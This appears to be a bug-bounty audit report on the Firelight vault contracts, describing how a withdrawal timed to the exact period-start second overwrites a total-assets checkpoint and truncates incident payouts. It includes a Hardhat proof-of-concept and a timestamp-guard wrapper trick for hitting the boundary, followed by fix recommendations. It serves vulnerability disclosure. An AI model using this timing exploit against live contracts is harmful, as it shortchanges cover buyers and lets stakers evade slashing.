# 90014 sc medium exact timestamp withdrawals at period boundaries permanently corrupt total asset snapshots truncating claim payouts and dos ing cover underwriting

**Submitted on Aug 22nd 2026 at 13:58:53 UTC by @hunraj for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #90014
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

## Executive Summary

The Firelight protocol relies on exact-timestamp snapshots of vault assets to determine underwriting capacity and cap incident payouts for a given cover period. However, a fundamental conflict exists between the vault's delayed withdrawal mechanics and the OpenZeppelin `Checkpoints` library used to record historical state.

If a user executes a `withdraw()` or `redeem()` at the exact second a period begins (`block.timestamp == vault.currentPeriodStart()`), the transaction overwrites the critical period-start checkpoint with a post-withdrawal balance. This permanently and unrecoverably corrupts the period's snapshot, causing `IncidentManager` to artificially truncate valid claim payouts (resulting in a direct loss of funds for cover buyers and evasion of slashing for stakers) and causing `CoverOrderAllocator` to severely under-allocate underwriting capacity (causing a Denial of Service on the protocol's business operations).

## Vulnerability Description

In `FirelightVault.sol`, withdrawals are delayed. When a user requests a withdrawal, their shares are burned immediately, and the underlying assets are moved to `pendingWithdrawAssets`.

Crucially, [`totalAssets()`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol?utm_source=immunefi#L428) subtracts these pending assets dynamically:

```solidity
function totalAssets() public view override returns (uint256) {
   return super.totalAssets() - pendingWithdrawAssets;
}
```

After updating balances, the vault pushes the new state to its historical trace via `_logTrace()`:

```solidity
_traceTotalAssets.push(Time.timestamp(), _totalAssets - assets);
```

The underlying library ([`core/lib/Checkpoints.sol`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/lib/Checkpoints.sol?utm_source=immunefi#L208)) enforces that if multiple checkpoints are pushed with the exact same timestamp key, the **last value overwrites the previous ones**:

```solidity
(bool exists, uint48 lastKey,) = self._trace.latestCheckpoint();
uint256 len = self._values.length;
if (exists && key == lastKey) {
   self._values[len - 1] = value; // OVERWRITE
} else {
   self._trace.push(key, uint208(len));
   self._values.push(value);
}
```

If a withdrawal is executed at exactly `block.timestamp == vault.currentPeriodStart()`, the checkpoint pushed by the withdrawal shares the exact same timestamp key as the boundary itself. Consequently, the period's initial snapshot is permanently overwritten by the artificially lowered post-withdrawal balance.

## Root Cause Analysis & Impact

The corruption of this specific checkpoint has catastrophic downstream effects on the two core functions of the protocol.

**1. Payout Truncation & Slashing Evasion (High Impact)** In `IncidentManager.sol`, when an approved loss is paid out, the protocol caps the payout to protect the vault:

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
// ...
uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

Even though the attacker's pending withdrawal correctly remains in `capturePeriodWithdrawals` (and thus `activePayableAmount` is correct), the `assetsAtCapturePeriod` variable is strictly capped by the corrupted snapshot.

* **Result**: Legitimate payouts to cover buyers are artificially truncated. The cover buyers suffer a permanent loss of funds they are owed. Simultaneously, because the total slashed amount is reduced, the attacker's pending withdrawal suffers a smaller pro-rata slash, providing a direct financial incentive to execute the attack.

**2. Underwriting Capacity DoS (Medium/High Impact)** In `CoverOrderAllocator._computeAvailableCapacity()`:

```solidity
uint256 totalAssetsCanonical = Decimals.convert(
   $.vault.totalAssetsAt($.vault.currentPeriodStart()), ...
);
```

The underwriting capacity for the month is calculated using the same corrupted snapshot. If the off-chain engine pre-matched orders expecting the actual collateral capacity, `commitAllocation()` will revert with `MatchingCapacityOverflow`. The protocol's capacity is artificially suppressed for the entire period.

## Preconditions

1. A staker (malicious or innocent) must initiate a `withdraw()` or `redeem()` in a block where `block.timestamp == vault.currentPeriodStart()`.
2. On EVM-compatible chains (including Flare, which has fast 1-to-2 second block times), an attacker can guarantee this condition trustlessly using a smart contract wrapper: `require(block.timestamp == targetTimestamp);`. If the block timestamp does not match, the transaction cheaply reverts, allowing the attacker to try again without risk.

## Step-by-Step Reproduction

1. `FirelightVault` holds 2,000,000 USDC.
2. Period 2 starts exactly at `T = 1750000000`.
3. An attacker deploys a smart contract that calls `vault.withdraw(500,000 USDC)` with a `require(block.timestamp == 1750000000)` constraint.
4. The transaction is mined exactly at `T`.
5. `totalAssets()` drops to 1,500,000 USDC. The `Checkpoints` trace for key `T` is overwritten with `1,500,000`.
6. Later, an incident occurs requiring a 1,800,000 USDC payout.
7. `IncidentManager.payout()` caps the payout using `totalAssetsAt(T)`, which returns 1,500,000.
8. Cover buyers are shortchanged by 300,000 USDC. The attacker evades their full pro-rata slashing obligation.

## Proof of Concept

## Proof of Concept

Save the following test file as `test/PoC_BoundaryOverwrite.js` and execute it via `npx hardhat test test/PoC_BoundaryOverwrite.js`.

```javascript
const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');
const { ethers } = require('hardhat');
const { deployVault } = require('./setup/fixtures.js');


describe('FirelightVault Boundary Checkpoint Overwrite PoC', function () {
   const DECIMALS = 6;
  
   // Test parameters
   const INITIAL_DEPOSIT = ethers.parseUnits('2000000', DECIMALS); // 2,000,000 USDC
   const WITHDRAW_AMOUNT = ethers.parseUnits('500000', DECIMALS);  //   500,000 USDC
   const EXPECTED_PAYOUT = ethers.parseUnits('1800000', DECIMALS); // 1,800,000 USDC


   it('Demonstrates payout truncation when withdraw occurs exactly at period boundary', async function () {
       // 1. Setup Environment
       const { firelight_vault, token_contract, payout_signer, payout_receiver, users, utils } = await loadFixture(
           deployVault.bind(null, {
               initial_deposit_limit: ethers.parseUnits('10000000', DECIMALS),
               period_configuration_duration: 604800
           })
       );
       const user1 = users[0];


       // 2. Initial Deposit
       await utils.mintAndApprove(INITIAL_DEPOSIT, user1);
       await firelight_vault.connect(user1).deposit(INITIAL_DEPOSIT, user1.address);


       expect(await firelight_vault.totalAssets()).to.equal(INITIAL_DEPOSIT);


       // 3. Trigger Boundary Condition (Set timestamp EXACTLY to the next period boundary)
       const nextPeriodStart = await firelight_vault.currentPeriodEnd();
       await time.setNextBlockTimestamp(nextPeriodStart);


       // 4. Execute the Exploit
       await firelight_vault.connect(user1).withdraw(WITHDRAW_AMOUNT, user1.address, user1.address);


       const currentBlock = await ethers.provider.getBlock('latest');
       expect(currentBlock.timestamp).to.equal(nextPeriodStart);


       // 5. Observe Checkpoint Corruption
       const corruptedSnapshot = await firelight_vault.totalAssetsAt(nextPeriodStart);
       const postWithdrawBalance = INITIAL_DEPOSIT - WITHDRAW_AMOUNT;
       expect(corruptedSnapshot).to.equal(postWithdrawBalance);


       // 6. Demonstrate Impact (Payout Truncation)
       await firelight_vault.connect(payout_signer).payout(payout_receiver.address, EXPECTED_PAYOUT, nextPeriodStart);


       const receiverBalance = await token_contract.balanceOf(payout_receiver.address);


       // The receiver is robbed of 300,000 USDC due to the overwritten checkpoint
       expect(receiverBalance).to.equal(postWithdrawBalance);
       expect(receiverBalance).to.be.lt(EXPECTED_PAYOUT);


       console.log(`\n\t--- POC RESULTS ---`);
       console.log(`\tInitial Assets    : ${ethers.formatUnits(INITIAL_DEPOSIT, DECIMALS)} USDC`);
       console.log(`\tWithdraw Amount   : ${ethers.formatUnits(WITHDRAW_AMOUNT, DECIMALS)} USDC`);
       console.log(`\tExpected Payout   : ${ethers.formatUnits(EXPECTED_PAYOUT, DECIMALS)} USDC`);
       console.log(`\tActual Payout     : ${ethers.formatUnits(receiverBalance, DECIMALS)} USDC`);
       console.log(`\tStolen/Lost Funds : ${ethers.formatUnits(EXPECTED_PAYOUT - receiverBalance, DECIMALS)} USDC\n`);
   });
});
```

## Security Recommendations

Relying on chronological state-change checkpoints to represent exact time-boundary snapshots is inherently unsafe when user actions can occur at the same timestamp.

**Recommendation 1: Explicit Period Snapshotting** Instead of querying `totalAssetsAt(timestamp)` via the generalized OpenZeppelin Checkpoints trace, implement an explicit mapping for period boundaries:

```solidity
mapping(uint256 => uint256) public periodStartAssets;
```

Ensure this mapping is updated strictly *before* any state changes apply if transitioning into a new period, or cached securely during a dedicated boundary-transition function.

**Recommendation 2: Snapshot Modification in `_computeAvailableCapacity` & `payout`** If retaining the existing `Checkpoints` structure, modify the architecture so that pending withdrawals initiated *during* the boundary block are mathematically reconstructed or ignored when querying boundary values, ensuring that `totalAssetsAt(periodStart)` always reflects the pre-action block state.
